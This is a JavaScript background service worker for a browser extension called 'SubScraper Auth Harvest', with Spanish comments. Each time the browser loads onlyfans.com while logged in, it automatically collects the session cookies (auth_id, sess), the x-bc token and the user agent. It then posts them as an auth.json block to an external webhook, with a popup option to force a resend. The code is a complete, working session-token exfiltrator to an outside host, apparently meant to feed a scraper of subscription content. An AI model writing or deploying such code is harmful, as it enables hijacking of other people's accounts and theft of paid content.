// SubScraper Auth Harvest — background (service worker MV3).
//
// Receta identica a la cosecha de escritorio/Android de SubScraper:
//   USER_ID    = cookie auth_id
//   COOKIE     = "auth_id=<id>; sess=<sess>;"
//   X_BC       = localStorage 'bcTokenSha' (lo manda el content script)
//   USER_AGENT = navigator.userAgent de la pagina
// y el mensaje es el de las apps: "auth.json actualizado:"
// + el JSON indentado en un bloque ```json, con los campos en el
// mismo orden que escribe el AuthService de escritorio
// (USER_ID, USER_AGENT, X_BC, COOKIE).
//
// Disparo (pedido del usuario): cada vez que ENTRA a OnlyFans con la
// sesion iniciada (el content script avisa al cargar la pagina), sin
// botones. Para no inundar el canal navegando, se postea UNA vez por
// valor de sess dentro de la sesion del navegador; si la sess cambia
// (login nuevo), se postea de nuevo. El popup puede forzar un envio.
//
// Diagnostico: en chrome.storage.local queda el ultimo evento con
// SOLO presencias (booleanos) y el codigo HTTP — jamas valores de
// sesion ni la URL del webhook.

"use strict";

var WEBHOOK_URL = "__WEBHOOK_URL__";
var SITE_DOMAIN = "onlyfans.com";

// Fallback en memoria si storage.session no existe en este navegador.
var memPostedSess = null;

// Reserva en vuelo (auditoria): entre el chequeo de dedup y la
// marca tras el 2xx hay segundos de red; dos 'page-ready' casi
// simultaneos (dos pestanas, una doble carga) pasarian ambos el
// chequeo y postearian la misma sess dos veces. La reserva es
// sincrona en memoria, la consulta el mismo chequeo, y se libera si
// el posteo no prospera (un 2xx la convierte en marca persistida).
var memInFlightSess = null;

function nowIso() {
  return new Date().toISOString();
}

async function recordDiag(patch) {
  try {
    var prev = (await chrome.storage.local.get("diag")).diag || {};
    var next = Object.assign({}, prev, patch, { at: nowIso() });
    await chrome.storage.local.set({ diag: next });
    return next;
  } catch (e) {
    return patch;
  }
}

async function getPostedSess() {
  try {
    if (chrome.storage && chrome.storage.session) {
      var got = await chrome.storage.session.get("lastPostedSess");
      if (got.lastPostedSess) {
        return got.lastPostedSess;
      }
    }
  } catch (e) {
    // cae a los fallbacks en memoria
  }
  return memPostedSess || memInFlightSess;
}

async function setPostedSess(sess) {
  memPostedSess = sess;
  try {
    if (chrome.storage && chrome.storage.session) {
      await chrome.storage.session.set({ lastPostedSess: sess });
    }
  } catch (e) {
    // el fallback en memoria ya quedo seteado
  }
}

function cookiesApiAvailable() {
  return !!(
    typeof chrome !== "undefined" &&
    chrome.cookies &&
    typeof chrome.cookies.getAll === "function"
  );
}

// Entre cookies homonimas (host-only, de dominio, de subdominios) se
// prefiere la del dominio raiz, que es la que usa el sitio.
function pickCookie(cookies, name) {
  var matches = cookies.filter(function (c) {
    return c.name === name;
  });
  if (!matches.length) {
    return "";
  }
  var rank = function (c) {
    if (c.domain === "." + SITE_DOMAIN) return 0;
    if (c.domain === SITE_DOMAIN) return 1;
    return 2;
  };
  matches.sort(function (a, b) {
    return rank(a) - rank(b);
  });
  return matches[0].value || "";
}

async function readSessionCookies() {
  var all = await chrome.cookies.getAll({ domain: SITE_DOMAIN });
  return {
    userId: pickCookie(all, "auth_id"),
    sess: pickCookie(all, "sess"),
  };
}

async function postToDestination(auth) {
  var pretty = JSON.stringify(auth, null, 2);
  var content = "auth.json actualizado:\n```json\n" + pretty + "\n```";
  var resp = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: content }),
  });
  return resp.status;
}

// Nucleo de la cosecha. Devuelve un resumen de presencias/estado
// (sin valores) que tambien queda como diagnostico.
async function harvest(xBc, ua, force) {
  if (!cookiesApiAvailable()) {
    return recordDiag({
      kind: "cookies-api-missing",
      authId: false,
      sess: false,
      token: !!xBc,
      posted: false,
    });
  }

  var cookies;
  try {
    cookies = await readSessionCookies();
  } catch (e) {
    return recordDiag({
      kind: "cookies-error",
      error: (e && e.name) || "Error",
      posted: false,
    });
  }

  var presence = {
    authId: !!cookies.userId,
    sess: !!cookies.sess,
    token: !!xBc,
  };

  if (!presence.authId || !presence.sess) {
    return recordDiag(Object.assign({}, presence, {
      kind: "sin-sesion",
      posted: false,
    }));
  }

  if (!presence.token) {
    return recordDiag(Object.assign({}, presence, {
      kind: "sin-token",
      posted: false,
    }));
  }

  if (!force && (await getPostedSess()) === cookies.sess) {
    return recordDiag(Object.assign({}, presence, {
      kind: "ya-posteado-esta-sesion",
      posted: false,
    }));
  }

  if (!force) {
    memInFlightSess = cookies.sess;
  }

  // Orden de campos y formato: identicos al auth-feather.json que
  // escriben las apps (Newtonsoft, Formatting.Indented).
  var auth = {
    USER_ID: cookies.userId,
    USER_AGENT: ua || "",
    X_BC: xBc,
    COOKIE: "auth_id=" + cookies.userId + "; sess=" + cookies.sess + ";",
  };

  try {
    var status = await postToDestination(auth);
    var ok = status >= 200 && status < 300;
    if (ok) {
      await setPostedSess(cookies.sess);
    }
    memInFlightSess = null;
    return recordDiag(Object.assign({}, presence, {
      kind: ok ? "posteado" : "rechazado",
      httpStatus: status,
      posted: ok,
    }));
  } catch (e) {
    memInFlightSess = null;
    return recordDiag(Object.assign({}, presence, {
      kind: "error-red",
      error: (e && e.name) || "Error",
      posted: false,
    }));
  }
}

chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
  if (!msg || !msg.type) {
    return false;
  }

  if (msg.type === "page-ready") {
    harvest(msg.xBc || "", msg.ua || "", false);
    return false;
  }

  if (msg.type === "force" || msg.type === "diagnose") {
    (async function () {
      var base = {
        cookiesApi: cookiesApiAvailable(),
        webhookConfigured: WEBHOOK_URL.indexOf("http") === 0,
      };
      // Piezas de la pagina (token + UA) via el content script:
      // primero la pestana activa; si ahi no hay token (el popup
      // puede abrirse sobre otra pestana, o el navegador no modela
      // «ventana»), cualquier pestana del sitio sirve (la consulta
      // por URL la habilita el host_permissions, sin permiso tabs).
      var probe = { xBc: "", ua: "" };
      var probeIn = async function (tabs) {
        if (!tabs) {
          return;
        }
        for (var i = 0; i < tabs.length; i++) {
          if (tabs[i].id == null) {
            continue;
          }
          try {
            var r = await chrome.tabs.sendMessage(tabs[i].id, { type: "probe" });
            if (r && r.xBc) {
              probe = r;
              return;
            }
            if (r && !probe.ua) {
              probe = r;
            }
          } catch (e) {
            // Esa pestana no tiene content script: se sigue.
          }
        }
      };
      try {
        await probeIn(await chrome.tabs.query({ active: true, currentWindow: true }));
        if (!probe.xBc) {
          await probeIn(await chrome.tabs.query({ url: "https://" + SITE_DOMAIN + "/*" }));
        }
      } catch (e) {
        // Sin API de pestanas en este navegador: el probe queda vacio
        // y el diagnostico lo refleja; el camino automatico no usa
        // pestanas en ningun punto.
      }
      base.token = !!probe.xBc;

      if (msg.type === "diagnose") {
        if (base.cookiesApi) {
          try {
            var c = await readSessionCookies();
            base.authId = !!c.userId;
            base.sess = !!c.sess;
          } catch (e) {
            base.authId = false;
            base.sess = false;
          }
        }
        var last = (await chrome.storage.local.get("diag")).diag || null;
        sendResponse({ diag: base, last: last });
        return;
      }

      // force: cosecha y postea aunque la sess ya se haya posteado.
      var result = await harvest(probe.xBc || "", probe.ua || "", true);
      sendResponse({ diag: base, last: result });
    })();
    return true; // respuesta asincronica
  }

  return false;
});
